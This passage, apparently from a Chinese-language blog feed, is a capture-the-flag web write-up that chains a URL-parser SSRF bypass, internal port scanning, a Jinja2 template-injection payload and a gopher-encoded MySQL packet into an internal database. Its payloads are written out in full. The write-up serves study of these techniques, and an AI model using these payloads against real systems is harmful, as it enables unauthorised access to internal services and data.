class="keyword">empty</span>(<span class="variable">$url</span>))&#123; </span><br><span class="line">    <span class="title function_ invoke__">safe_request_url</span>(<span class="variable">$url</span>); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>流程 获取get传入的<code>url</code>参数 ——&gt; 判断是否为空（不为空进入下一步）——&gt;进入<code>safe_request_url()</code>——&gt;调用<code>check_inner_ip()</code>处理<code>url</code>参数（判断是不是内网ip）——&gt; <code>curl</code>获得的<code>$url</code></p><h2 id="绕过check-inner-ip"><a href="#绕过check-inner-ip" class="headerlink" title="绕过check_inner_ip"></a>绕过check_inner_ip</h2><p><img                         lazyload                       alt="image"                       data-src="https://i.loli.net/2019/03/22/5c94ad8b8e878.png"                                        ></p><p><a class="link"   href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf" >https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf<i class="fas fa-external-link-alt"></i></a></p><p><img                         lazyload                       alt="image"                       data-src="https://i.loli.net/2019/03/22/5c94a85cd8756.png"                                        ></p><p>在orange大佬的pdf中，可以看到不同URL解析器对url的不同解析，利用这种差异可以绕过对内网ip地址的检测 </p><p>如图 parse_url解析最后一个@后面的地址而curl解析的是第一个@后的地址</p><p><img                         lazyload                       alt="image"                       data-src="https://i.loli.net/2019/03/22/5c94aa48f2deb.png"                                        ></p><h2 id="Flask-SSTI"><a href="#Flask-SSTI" class="headerlink" title="Flask  SSTI"></a>Flask  SSTI</h2><p>根据上一步可以构造url为<code>url=http://aa@127.0.0.1:80@www.baidu.com/flag.php</code></p><p><img                         lazyload                       alt="image"                       data-src="https://i.loli.net/2019/03/22/5c94adfd71db0.png"                                        ></p><p>获得一个<code>string(15) &quot;172.11.243.0/24&quot;</code> ip段提示</p><p>猜测flag在这个段的某个ip的某个端口上，上burp进行爆破一下</p><p><img                         lazyload                       alt="image"                       data-src="https://i.loli.net/2019/03/22/5c94b1dca14e7.png"                                        ></p><p>访问获得源码</p><p><img                         lazyload                       alt="image"                       data-src="https://i.loli.net/2019/03/22/5c94b21e1e924.png"                                        ></p><p><img                         lazyload                       alt="image"                       data-src="https://i.loli.net/2019/03/22/5c94b3d61e308.png"                                        ></p><p>上面的源码是一个典型的的Flask Jinjia SSTI模板注入，这里过滤了<code>(</code>、<code>)</code>、<code>self</code>、<code>config</code></p><p>参考<a class="link"   href="https://www.xmsec.cc/ssti-and-bypass-sandbox-in-jinja2/" >https://www.xmsec.cc/ssti-and-bypass-sandbox-in-jinja2/<i class="fas fa-external-link-alt"></i></a> 构造出payload</p><p><code>&#123;&#123;url_for.__globals__[%27current_app%27].config&#125;&#125;</code> 获取属性和变量</p><p><img                         lazyload                       alt="image"                       data-src="https://i.loli.net/2019/03/24/5c973b17521a3.png"                                        ></p><p>这里值得一提的是之前在扫80端口的时候意外发现<code>172.11.243.1:80</code>这个ip存在phpmyadmin，再结合这个HINT就尝试了phpmyadmin爆破。一顿操作猛如虎，然而战斗力只有5 在这里钻牛角尖耗了一个多小时，最后问了问郁师傅，郁师傅表示一脸懵逼</p><p><img                         lazyload                       alt="image"                       data-src="https://i.loli.net/2019/03/24/5c973debc4f04.png"                                        ></p><h2 id="SSRF-TO-RCE-IN-Mysql"><a href="#SSRF-TO-RCE-IN-Mysql" class="headerlink" title="SSRF TO RCE IN Mysql"></a>SSRF TO RCE IN Mysql</h2><p>HINT提示是和mysql有关那么再扫描下这个ip段都有哪些ip开放了3306</p><p><img                         lazyload                       alt="image"                       data-src="https://i.loli.net/2019/03/24/5c973ee9ca8db.png"                                        ></p><p><img                         lazyload                       alt="image"                       data-src="https://i.loli.net/2019/03/24/5c97400d635fc.png"                                        ></p><p>看到这里想起了之前看过的一篇文章 SSRF TO  RCE IN Mysql  </p><p><a class="link"   href="https://www.wtfsec.org/5112/ssrf-to-rce-in-mysql/" >https://www.wtfsec.org/5112/ssrf-to-rce-in-mysql/<i class="fas fa-external-link-alt"></i></a></p><p>文章中提到如下内容</p><blockquote><h6 id="MySQL认证过程："><a href="#MySQL认证过程：" class="headerlink" title="MySQL认证过程："></a>MySQL认证过程：</h6><p>MySQL客户端连接并登录服务器时存在两种情况：需要密码认证以及无需密码认证。当需要密码认证时使用挑战应答模式，服务器先发送salt然后客户端使用salt加密密码然后验证；当无需密码认证时直接发送TCP/IP数据包即可。所以在非交互模式下登录并操作MySQL只能在无需密码认证，未授权情况下进行，本文利用SSRF漏洞攻击MySQL也是在其未授权情况下进行的。</p></blockquote><p>无需密码认证时直接发送TCP/IP数据包，这里可以利用gopher进行mysql认证。</p><p>这里可以创建一个无密码的<code>yuligeeee123321</code>用户 然后在登录和执行命令时使用wireshark抓包</p><p><img                         lazyload                       alt="image"                       data-src="https://i.loli.net/2019/03/24/5c9742f0e1cd4.png"                                        ></p><p><img                         lazyload                       alt="image"                       data-src="https://i.loli.net/2019/03/24/5c97431518511.png"                                        ></p><p>找到发送到3396端口的数据包 保存为raw 并将数据整理成一行后进行两次url编码即可</p><p>也可以使用github中的开源项目<a class="link"   href="https://github.com/tarunkant/Gopherus" >Gopherus<i class="fas fa-external-link-alt"></i></a> 生成</p><p><img                         lazyload                       alt="image"                       data-src="https://i.loli.net/2019/03/24/5c9744813b105.png"                                        ></p><p>生成后的payload需要在进行一次url编码才可以利用</p><p><code>_%25ae%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2579%2575%256c%2569%2567%2565%2565%2565%2565%2531%2532%2533%2533%2532%2531%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%2510%2500%2500%2500%2503%2573%2568%256f%2577%2520%2564%2561%2574%2561%2562%2561%2573%2565%2573%253b%2501%2500%2500%2500%2501</code></p><p><img                         lazyload                       alt="image"                       data-src="https://i.loli.net/2019/03/24/5c9749da8c49c.png"                                        ></p><p>获得数据库接下来就是获取表查询数据了</p><p><img                         lazyload                       alt="image"                       data-src="https://i.loli.net/2019/03/24/5c974a2a47b19.png"                                        ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CTF交流群——WEB&quot;&gt;&lt;a href=&quot;#CTF交流群——WEB&quot; class=&quot;headerlink&quot; title=&quot;CTF交流群——WEB&quot;&gt;&lt;/a&gt;CTF交流群——WEB&lt;/h1&gt;&lt;h2 id=&quot;源码分析&quot;&gt;&lt;a href=&quot;#源码分析&quot; class=&quot;</summary>
      
    
    
    
    <category term="Web" scheme="http://example.com/categories/Web/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
</feed>
